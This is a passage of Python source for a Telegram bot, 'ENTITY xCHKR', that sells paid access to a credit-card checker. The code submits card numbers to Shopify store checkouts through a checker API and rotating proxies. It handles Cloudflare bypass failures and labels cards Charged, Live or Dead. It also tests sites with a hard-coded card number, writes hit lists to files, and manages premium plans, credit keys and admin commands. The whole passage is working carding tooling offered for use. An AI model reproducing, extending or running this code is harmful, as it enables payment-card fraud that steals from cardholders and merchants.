                'retry': True, 'gateway': gateway, 'price': price,
                'refund_credit': True,
            }

        response_lower = response_msg.lower()

        if 'cloudflare bypass failed' in response_lower:
            return {
                'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card,
                'retry': True, 'gateway': gateway, 'price': price,
                'refund_credit': True,
            }

        # CRITICAL SITE TESTING LOGIC:
        # api_status=True means site is WORKING (even if card declined)
        # This includes: Charged, Approved, Declined, Insufficient Funds, etc.
        if api_status is True or api_status in ('True', 'true'):
            if 'charged' in response_lower:
                return {
                    'status': 'Charged', 'message': response_msg, 'card': card,
                    'site': site, 'gateway': gateway, 'price': price,
                }
            elif any(x in response_lower for x in ['declined', 'insufficient', 'expired', 'invalid']):
                # Card declined but site is working - this is a successful site test
                return {
                    'status': 'Declined', 'message': response_msg, 'card': card,
                    'site': site, 'gateway': gateway, 'price': price,
                }
            else:
                return {
                    'status': 'Approved', 'message': response_msg, 'card': card,
                    'site': site, 'gateway': gateway, 'price': price,
                }
        else:
            # api_status=False means site error
            return {
                'status': 'Dead', 'message': response_msg, 'card': card,
                'site': site, 'gateway': gateway, 'price': price,
            }

    except asyncio.TimeoutError:
        return {
            'status': 'Site Error', 'message': 'Request timeout', 'card': card,
            'retry': True, 'refund_credit': True,
        }
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {
                'status': 'Site Error', 'message': error_msg, 'card': card,
                'retry': True, 'refund_credit': True,
            }
        return {
            'status': 'Dead', 'message': error_msg, 'card': card,
            'gateway': 'Unknown', 'price': '-', 'refund_credit': True,
        }

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'refund_credit': True}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'refund_credit': True}

    for attempt in range(max_retries):
        site = random.choice(sites)
        # Use intelligent proxy selection instead of random
        best_proxies = choose_best_proxies(proxies, n=min(3, len(proxies)))
        proxy = random.choice(best_proxies) if best_proxies else random.choice(proxies)

        start_time = time.time()
        result = await check_card(card, site, proxy)
        elapsed_ms = (time.time() - start_time) * 1000

        # Update proxy score based on result
        is_success = result.get('status') in ('Charged', 'Approved')
        update_proxy_score(proxy, is_success, elapsed_ms)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {
            'status': 'Dead',
            'message': f'Site errors: {last_result["message"]}',
            'card': card,
            'gateway': last_result.get('gateway', 'Unknown'),
            'price': last_result.get('price', '-'),
            'site': 'Multiple',
            'refund_credit': last_result.get('refund_credit', False),
        }

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'refund_credit': True}

# ========== SITE / PROXY TESTERS ==========
async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        raw = await call_checker_api(params)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except Exception:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        t0 = time.time()
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        # 10-second window: dead proxies return an error quickly; live proxies
        # will be mid-checkout (15-30 s) when the timeout fires.
        raw = await asyncio.wait_for(call_checker_api(params), timeout=10)
        elapsed_ms = (time.time() - t0) * 1000
        # A valid response must carry a Status key (True = Approved/Dead, False = error)
        if 'Status' not in raw:
            return {'proxy': proxy, 'status': 'dead'}
        response_msg = (raw.get('Response', '') or raw.get('error', '')).lower()
        gateway_msg  = (raw.get('Gateway', '') or '').lower()
        # Detect proxy-specific failures surfaced by the API
        proxy_keywords = (
            'proxy dead', 'proxy error', 'invalid proxy format', 'no proxy',
            '407', 'tunnel connection failed',
        )
        if any(kw in response_msg or kw in gateway_msg for kw in proxy_keywords):
            return {'proxy': proxy, 'status': 'dead'}
        # Record speed for alive proxies
        prev = _proxy_speed_cache.get(proxy)
        _proxy_speed_cache[proxy] = (
            elapsed_ms if prev is None else 0.7 * prev + 0.3 * elapsed_ms
        )
        return {'proxy': proxy, 'status': 'alive'}
    except asyncio.TimeoutError:
        # Timeout means the checkout is still processing → proxy is alive and
        # responding. Record a high latency so the bot prefers faster proxies.
        _proxy_speed_cache[proxy] = _proxy_speed_cache.get(proxy, 10000)
        return {'proxy': proxy, 'status': 'alive'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

# ========== PROGRESS / RESULTS ==========
async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = (
        results['charged'][0]['gateway'] if results['charged']
        else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    )

    remaining_credits = await get_user_credits(user_id)

    progress_text = f"""<b>⚡💳 UNKNOWN ENTITY 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except Exception:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = (
        results['charged'][0]['gateway'] if results['charged']
        else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    )

    remaining_credits = await get_user_credits(user_id)

    summary = f"""<b>⚡💳ㅤUNKNOWNENTITY𝙧 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway','Unknown')} | {r.get('price','-')} | {r['message'][:100]} | {r.get('site','Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway','Unknown')} | {r.get('price','-')} | {r['message'][:100]} | {r.get('site','Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway','Unknown')} | {r.get('price','-')} | {r['message'][:100]} | {r.get('site','Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except Exception:
        pass

# ========== BOT COMMANDS ==========
joined_users = set()

def set_user_joined(user_id):
    joined_users.add(user_id)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned from using this bot."))

    joined, missing_chats = await check_user_joined(user_id)
    if not joined:
        buttons = [[Button.url("📢 Join Channel", link)] for link in missing_chats]
        buttons.append([Button.inline("✅ Joined", b"check_joined")])
        missing_text = "\n".join([f"• <a href='{link}'>Click here to join</a>" for link in missing_chats])
        return await event.reply(
            premium_emoji(f"<b>⚠️ Access Denied!</b>\n\nYou must join the following channels first:\n\n{missing_text}\n\nThen click 'Joined' button."),
            buttons=buttons, parse_mode='html'
        )

    set_user_joined(user_id)
    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    credits = await get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)

    text = f"""<b>⚡💳 Welcome to ENTITY xCHKR! 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /cc card|mm|yy|cvv - Check single CC (1 credit)
• /chk - Reply to .txt file to check cards (1 credit per card)
⚠️NOTE - 
•  No proxy or site setup needed! 
• The bot comes with pre-configured 
   proxies & sites. 
• Just use /cc or /chk and start
   checking cards instantly! 💳⚡</blockquote>

<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /site - Check all sites & remove dead
• /addsite site.com - Add single site
• /addsitetxt - Add sites from .txt file (bulk)
• /rm url - Remove a specific site</blockquote>
<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /proxy - Check all proxies & remove dead
• /addproxy - Add proxies (one per line)
• /chkproxy proxy - Check single proxy
• /rmproxy proxy - Remove single proxy
• /rmproxyindex 1,2,3 - Remove by index
• /clearproxy - Remove all proxies
• /getproxy - Get all proxies</blockquote>
<b>⚡💠 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 & 𝐊𝐞𝐲𝐬</b>
<blockquote>• /redeem KEY - Redeem premium key (Premium + Credits)
• /redeemcredit KEY - Redeem credit key (Only credits)
• /plans - Check premium plans
• /info - Your account details & credits
⚠️JOIN LOGS - https://t.me/+6ZvR2byX9RdhYzll</blockquote>"""

    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        if expiry != 'Unknown':
            expiry_str = datetime.fromisoformat(expiry).strftime('%Y-%m-%d')
        else:
            expiry_str = 'Unknown'
        text += f"\n\n<b>💎 Premium Access Active!</b>\n<b>📋 Plan:</b> {plan_name}\n<b>💰 Credits Available:</b> {credits}\n<b>📅 Expires:</b> {expiry_str}"
    else:
        text += f"\n\n<b>⚠️ Premium required for /cc and /chk commands</b>\n<b>💰 Credits Available:</b> {credits}"

    if is_adm:
        text += """\n<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /filter - Set site price filter
• /apistatus - Show API health & workers
• /addpremium user_id plan_name - Add premium with plan
• /addpremiumcustom user_id days credits - Add custom premium
• /removepremium user - Remove premium
• /addcredits user amount - Add credits to user
• /removecredits user amount - Remove credits from user
• /genpremiumkey amount plan - Generate premium keys
• /genpremiumkey amount custom days credits - Generate custom premium keys
• /gencreditkey amount credits - Generate credit-only keys
• /ban user - Ban user
• /unban user - Unban user
• /stats - Bot statistics
• /broadcast msg - Broadcast message to ALL users</blockquote>"""

    text += f"\n\n<b>━━━━━━━━━━━━━━━━━</b>\n🤖 <b>Bot made by UNKNOWNENTITY <a href=\"https://t.me/Unknow0nentity\">@Unknow0nentity</a> TELEGRAM</b>"
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/info'))
async def info_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')

    credits = await get_user_credits(user_id)
    is_prem = is_premium(user_id)
    plan_name = get_user_plan_name(user_id)

    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        days_added = premium_data.get('days', 0)
        added_at = premium_data.get('added_at', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d %H:%M:%S')
            days_left = (expiry_dt - datetime.now()).days
        else:
            expiry_str = 'Unknown'
            days_left = 0

        text = f"""<b>💎 YOUR ACCOUNT INFO 💎</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> <b>PREMIUM</b>
<b>📋 Plan:</b> {plan_name}
<b>💰 Credits:</b> {credits}
<b>📅 Premium Expires:</b> {expiry_str}
<b>⏰ Days Left:</b> {days_left} days
<b>📆 Plan Duration:</b> {days_added} days
<b>🕐 Activated:</b> {added_at}

<b>━━━━━━━━━━━━━━━━━</b>
💡 Use /plans to see available plans
💡 Contact @Unknow0nentity to recharge

🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""
    else:
        text = f"""<b>⚠️ YOUR ACCOUNT INFO ⚠️</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> FREE USER
<b>📋 Plan:</b> FREE
<b>💰 Credits:</b> {credits}

<b>━━━━━━━━━━━━━━━━━</b>
💎 Premium Required to use /cc and /chk
💡 Use /plans to see premium plans
💡 Use /redeem to activate premium key
💡 Use /redeemcredit to activate credit key

🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""

    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, _ = await check_user_joined(user_id)
    if joined:
        set_user_joined(user_id)
        await event.edit(premium_emoji("✅ <b>Verification successful!</b>\n\nUse /start again to access the bot."), parse_mode='html')
    else:
        await event.answer("❌ You haven't joined all channels yet! Please join first.", alert=True)

@bot.on(events.NewMessage(pattern='/plans'))
async def plans_command(event):
    text = """<b>💎 PREMIUM PLANS 💎</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>🎁 TRIAL</b>
• 1 Day Access
• 3,000 Credits
• Price: 2$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥉 BRONZE</b>
• 3 Days Access
• 8,000 Credits
• Price: 4$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥈 SILVER</b>
• 7 Days Access
• 14,000 Credits
• Price: 8$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥇 GOLD</b>
• 14 Days Access
• 20,000 Credits
• Price: 12$
<b>━━━━━━━━━━━━━━━━━</b>

<b>💎 PLATINUM</b>
• 24 Days Access
• 30,000 Credits
• Price: 22$
<b>━━━━━━━━━━━━━━━━━</b>

<b>⚡ How to Purchase?</b>
Contact: <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a>

<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""
    await event.reply(premium_emoji(text), parse_mode='html')

# ========== REDEEM COMMANDS ==========

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_premium_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/redeem PREMIUM_KEY</code>"), parse_mode='html')

    key = args[1].strip().upper()
    success, msg = await redeem_premium_key(key, user_id)

    if success:
        credits = await get_user_credits(user_id)
        await event.reply(premium_emoji(f"✅ <b>{msg}</b>\n\n💰 Your Credits: {credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>{msg}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeemcredit'))
async def redeem_credit_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/redeemcredit CREDIT_KEY</code>"), parse_mode='html')

    key = args[1].strip().upper()
    success, credits = await redeem_credit_key(key, user_id)

    if success:
        total_credits = await get_user_credits(user_id)
        await event.reply(premium_emoji(f"✅ <b>Credit Key Redeemed!</b>\n\n💰 Added: {credits} credits\n💳 Total Credits: {total_credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>{credits}</b>"), parse_mode='html')

# ========== SITE FILTER COMMAND ==========

@bot.on(events.NewMessage(pattern='/filter'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([f"• <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()])
        await event.reply(premium_emoji(f"<b>🎯 Site Price Filters</b>\n\n{filters_text}\n\n<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n<b>Usage:</b> <code>/filter under10</code>"), parse_mode='html')
        return

    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(premium_emoji(f"❌ Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}"), parse_mode='html')
        return

    ACTIVE_FILTER = filter_key
    all_sites = load_sites()

    if filter_key == "all":
        await event.reply(premium_emoji(f"✅ <b>Filter set to:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\nAll sites will be used."), parse_mode='html')
        return

    asyncio.create_task(warm_price_cache(all_sites, notify_chat_id=event.chat_id))
    await event.reply(premium_emoji(
        f"✅ <b>Filter set to:</b> {SITE_FILTERS[filter_key]['name']}\n\n"
        f"🔄 Warming up price cache for <b>{len(all_sites)}</b> sites.\n"
        f"Checks will use only sites whose price is cached and within the filter.\n"
        f"You'll be notified here when warmup completes.\n\n"
        f"Use /cachestatus to track progress."
    ), parse_mode='html')

# ========== ADMIN - CACHE STATUS ==========

@bot.on(events.NewMessage(pattern='/cachestatus'))
async def cache_status_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    all_sites = load_sites()
    total = len(all_sites)
    cached_count = sum(1 for s in all_sites if s in _site_price_cache)
    remaining = total - cached_count

    flt = SITE_FILTERS[ACTIVE_FILTER]
    min_p, max_p = flt["min"], flt["max"]
    matched = sum(
        1 for s in all_sites
        if s in _site_price_cache
        and _site_price_cache[s][1] is not None
        and min_p <= _site_price_cache[s][1] <= max_p
    )

    warmup_status = "🔄 In progress" if _cache_warmup_in_progress else "✅ Idle"
    progress_info = ""
    if _cache_warmup_in_progress and _cache_warmup_total > 0:
        progress_info = f"\n📊 Progress: {_cache_warmup_done}/{_cache_warmup_total}"

    await event.reply(premium_emoji(
        f"<b>📊 Cache Status</b>\n\n"
        f"🎯 Active Filter: <b>{flt['name']}</b>\n"
        f"🔄 Warmup: {warmup_status}{progress_info}\n\n"
        f"📦 Total sites: <b>{total}</b>\n"
        f"✅ Cached: <b>{cached_count}</b>\n"
        f"⏳ Uncached: <b>{remaining}</b>\n"
        f"🎯 Matching filter: <b>{matched}</b>\n\n"
        f"💾 Product cache: <b>{len(_product_cache)}</b> sites"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/refreshproducts'))
async def refresh_products_command(event):
    """Admin command to refresh the product variant cache for all sites."""
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    sites = await load_filtered_sites()
    if not sites:
        return await event.reply(premium_emoji("❌ No sites available to refresh!"), parse_mode='html')

    max_price = None
    if ACTIVE_FILTER != "all":
        max_price = SITE_FILTERS[ACTIVE_FILTER]["max"]

    status_msg = await event.reply(
        premium_emoji(f"🔄 <b>Refreshing product cache...</b>\n\nFetching variants for {len(sites)} sites..."),
        parse_mode='html'
    )

    # Refresh products in batches
    sem = asyncio.Semaphore(10)
    success = 0
    failed = 0

    async def refresh_single(site):
        nonlocal success, failed
        async with sem:
            variants = await fetch_and_cache_products(site, max_price=max_price)
            if variants:
                success += 1
            else:
                failed += 1

    tasks = [refresh_single(s) for s in sites]
    await asyncio.gather(*tasks, return_exceptions=True)

    await status_msg.edit(premium_emoji(
        f"✅ <b>Product cache refresh complete!</b>\n\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n"
        f"💾 Total cached: {len(_product_cache)} sites"
    ), parse_mode='html')

# ========== ADMIN - API STATUS ==========

@bot.on(events.NewMessage(pattern='/apistatus'))
async def apistatus_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    status_msg = await event.reply(premium_emoji("🔄 <b>Checking API endpoints...</b>"), parse_mode='html')

    lines = ["<b>📡 API Endpoints Status</b>", "<b>━━━━━━━━━━━━━━━━━</b>"]

    for ep in API_ENDPOINTS:
        # Derive base URL (strip /shopify suffix if present)
        base = ep.rstrip("/")
        if base.endswith("/shopify"):
            base = base[:-len("/shopify")]

        # Ping /health with timing
        health_ok = False
        ms = -1
        try:
            t0 = time.time()
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(f"{base}/health") as r:
                    health_ok = r.status == 200
            ms = int((time.time() - t0) * 1000)
        except Exception:
            pass

        # Query /workers
        workers = "N/A"
        try:
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(f"{base}/workers") as r:
                    if r.status == 200:
                        wdata = await r.json(content_type=None)
                        workers = wdata.get("workers", "N/A")
        except Exception:
            pass

        icon = "✅" if health_ok else "❌"
        ping_str = f"{ms}ms" if ms >= 0 else "timeout"
        lines.append(f"{icon} <code>{base}</code>")
        lines.append(f"   Workers: <b>{workers}</b> | Ping: <b>{ping_str}</b>")
        lines.append("<b>━━━━━━━━━━━━━━━━━</b>")

    lines.append("\n🤖 <b>Bot made by UNKNOWNENTITY <a href=\"https://t.me/Unknow0nentity\">@Unknow0nentity</a> TELEGRAM</b>")
    await status_msg.edit(premium_emoji("\n".join(lines)), parse_mode='html')

# ========== ADMIN - ADD PREMIUM BY PLAN NAME ==========

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 3:
        await event.reply(premium_emoji("❌ Usage: <code>/addpremium user_id plan_name</code>\n\n<u>Available Plans:</u>\n• trial\n• bronze\n• silver\n• gold\n• platinum\n\nExample: <code>/addpremium 7845916818 platinum</code>"), parse_mode='html')
        return

    try:
        target_id = int(args[1])
        plan_key = args[2].lower()

        if plan_key not in PLANS:
            await event.reply(premium_emoji("❌ Invalid plan! Available: trial, bronze, silver, gold, platinum"), parse_mode='html')
            return

        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']

        await add_premium_user(target_id, plan_key, days, credits)

        await event.reply(premium_emoji(f"✅ <b>Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_info['name']}\n📅 Days: {days}\n�� Credits: {credits}"), parse_mode='html')

        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"🎉 <b>Premium Access Granted!</b>\n\n📋 Plan: {plan_info['name']}\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except Exception:
            pass

    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user_id!"), parse_mode='html')

# ========== ADMIN - ADD CUSTOM PREMIUM ==========

@bot.on(events.NewMessage(pattern='/addpremiumcustom'))
async def add_premium_custom_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 4:
        await event.reply(premium_emoji("❌ Usage: <code>/addpremiumcustom user_id days credits</code>\n\nExample: <code>/addpremiumcustom 7845916818 15 5000</code>"), parse_mode='html')
        return

    try:
        target_id = int(args[1])
        days = int(args[2])
        credits = int(args[3])

        if days <= 0 or credits <= 0:
            await event.reply(premium_emoji("❌ Days and credits must be positive!"), parse_mode='html')
            return

        await add_premium_user(target_id, "custom", days, credits)

        await event.reply(premium_emoji(f"✅ <b>Custom Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📅 Days: {days}\n💰 Credits: {credits}"), parse_mode='html')

        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"🎉 <b>Premium Access Granted!</b>\n\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except Exception:
            pass

    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user_id, days, or credits!"), parse_mode='html')

# ========== ADMIN CREDITS COMMANDS ==========

@bot.on(events.NewMessage(pattern='/addcredits'))
async def add_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("❌ Usage: <code>/addcredits user_id amount</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply(premium_emoji("❌ Invalid user_id or amount"), parse_mode='html')

    await add_credits(target_id, amount)
    new_total = await get_user_credits(target_id)
    await event.reply(premium_emoji(f"✅ <b>Credits Added!</b>\n\nUser: <code>{target_id}</code>\nAdded: {amount}\nNew Total: {new_total}"), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji(f"💰 <b>{amount} Credits Added!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern='/removecredits'))
async def remove_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("❌ Usage: <code>/removecredits user_id amount</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply(premium_emoji("❌ Invalid user_id or amount"), parse_mode='html')

    await remove_credits(target_id, amount)
    new_total = await get_user_credits(target_id)
    await event.reply(premium_emoji(f"✅ <b>Credits Removed!</b>\n\nUser: <code>{target_id}</code>\nRemoved: {amount}\nNew Total: {new_total}"), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji(f"⚠️ <b>{amount} Credits Removed!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except Exception:
        pass

# ========== ADMIN - REMOVE PREMIUM ==========

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/removepremium user_id</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')

    premium_data = load_premium_users()
    if str(target_id) in premium_data:
        del premium_data[str(target_id)]
        save_premium_users(premium_data)
        await event.reply(premium_emoji(f"✅ <b>Premium removed!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
        try:
            await bot.send_message(target_id, premium_emoji("⚠️ <b>Premium Access Removed!</b>\n\nYour premium access has been revoked."), parse_mode='html')
        except Exception:
            pass
    else:
        await event.reply(premium_emoji(f"❌ User <code>{target_id}</code> does not have premium"), parse_mode='html')

# ========== ADMIN - SITE MANAGEMENT ==========

@bot.on(events.NewMessage(pattern='/addsite'))
async def add_site_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
